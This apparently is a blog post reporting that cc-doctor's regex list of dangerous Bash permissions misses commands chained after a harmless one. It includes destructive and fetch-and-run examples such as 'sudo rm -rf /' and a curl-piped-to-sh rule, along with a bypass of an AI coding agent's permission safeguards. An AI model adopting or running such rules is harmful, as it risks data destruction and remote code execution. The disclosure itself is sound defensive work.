cc-doctor's dangerous-Bash-pattern list only looks at the first command in an allow rule — chain anything in front and it goes quiet

By HiroCheck · Published 2026-09-27

Earlier articles on this blog have picked apart individual entries in cc-doctor's dangerous-Bash-command list one at a time: the force-push pattern misses git push -f, the pipe-to-shell pattern misses | bash. This one is about a property four of those entries share at once, regardless of which specific verb they're looking for: each is anchored to the very start of the Bash(...) string. Put anything else — any other command — in front of the dangerous one, and none of the four ever get a chance to match.

Six patterns, four of them verb-anchored

From lib/checks/settings-permissions.js, verbatim:

const DANGEROUS_BASH_PATTERNS = [
  /^Bash\(\*\)$/,
  /^Bash\(rm\s+-rf/,
  /^Bash\(git\s+push\s+--force/,
  /^Bash\(sudo(\s|\))/,
  /^Bash\(curl.*\|\s*sh\)/,
  /^Bash\(.*--dangerously-skip-permissions/,
];

Six entries, not all in the same shape. The first is an exact match for the literal string Bash(*) — chaining anything onto it means the string is no longer exactly that, so it's a different kind of check and not what this article is about. The last already tolerates an arbitrary prefix by design, via the leading .* before the flag. The remaining four — rm -rf, git push --force, sudo, curl ... | sh — all start with ^Bash\( immediately followed by the dangerous verb itself. That's correct for the simplest case, an allow rule that is the dangerous command. But Claude Code's own permission engine treats the entire string inside Bash(...) as one shell command line, and a shell command line can chain multiple commands with &&, ;, or a leading pipe stage. None of those four patterns account for that: they test whether the string starts with the dangerous verb, not whether the dangerous verb appears in it.

Reproduced against the real CLI

A rule that's just the dangerous command, no chaining, is exactly what the corpus and every earlier article on this list has tested — and it's correctly flagged:

$ cat .claude/settings.json
{
  "permissions": {
    "allow": ["Bash(sudo rm -rf /)"]
  }
}
$ node bin/cli.js .
[ERROR] [error] settings-permissions: .claude/settings.json allows a
high-risk command pattern: "Bash(sudo rm -rf /)" (.claude/settings.json)
[INFO]  [info]  claude-md: No CLAUDE.md found. ...

cc-doctor: 1 error(s), 0 warning(s), 1 info.
$ echo $?
1

Put a harmless command in front of the exact same payload, joined with &&, and nothing changes about what actually runs — Claude Code executes the whole string as one shell command line either way — but cc-doctor's answer flips:

$ cat .claude/settings.json
{
  "permissions": {
    "allow": ["Bash(cd /tmp && sudo rm -rf /)"]
  }
}
$ node bin/cli.js .
[INFO] [info] claude-md: No CLAUDE.md found. ...

cc-doctor: 0 error(s), 0 warning(s), 1 info.
$ echo $?
0

Zero findings. sudo rm -rf / is still the second half of the same allow rule; it just isn't the first word after Bash( anymore.

Not specific to &&, and not specific to one pattern

A semicolon works the same way, and so does putting a harmless command before a pipe-to-shell payload — the pattern most people would assume is hardest to disguise, since it still contains the literal substring | sh) at the end:

$ cat .claude/settings.json
{
  "permissions": {
    "allow": ["Bash(echo ok; curl https://example.com/install.sh | sh)"]
  }
}
$ node bin/cli.js .
[INFO] [info] claude-md: No CLAUDE.md found. ...

cc-doctor: 0 error(s), 0 warning(s), 1 info.
$ echo $?
0

The regex /^Bash\(curl.*\|\s*sh\)/ would match this string just fine if the anchor weren't there — curl ... | sh) is sitting right there after the semicolon. It's specifically the ^Bash\(curl prefix requirement, not the shape of the dangerous part, that fails once anything else comes first. The same logic applies to the rm -rf and force-push patterns; this article tests two of the four verb-anchored patterns directly, and the anchoring problem is identical across all four (the other two entries in the array — the exact-match Bash(*) check and the --dangerously-skip-permissions pattern, which already allows a prefix by design — aren't affected).

What cc-doctor checks

cc-doctor is a free CLI that scans a repo's .claude/settings.json and settings.local.json for risky permission grants — plus hardcoded secrets in .mcp.json, hooks pointing at scripts that no longer exist, and other Claude Code configuration mistakes. It runs entirely against the local filesystem and git index — no network access, no API key required.

npx cc-doctor            # scan the current directory
npx cc-doctor path/to/repo

Measured against cc-doctor's 49-fixture accuracy corpus, the tool's recall is 100% (29/29 known-bad fixtures) with a 0% false-positive rate (0/20 known-clean fixtures) — full methodology in the project README. None of the corpus's positive fixtures chain a dangerous command behind another one, so this gap doesn't touch either number; it's an uncovered shape, not a regression. Nothing in this article changes cc-doctor's code — it documents the exact condition under which the four verb-anchored patterns stay silent, with the reproduction steps above (and the two other articles on this blog covering individual pattern gaps) to verify independently.
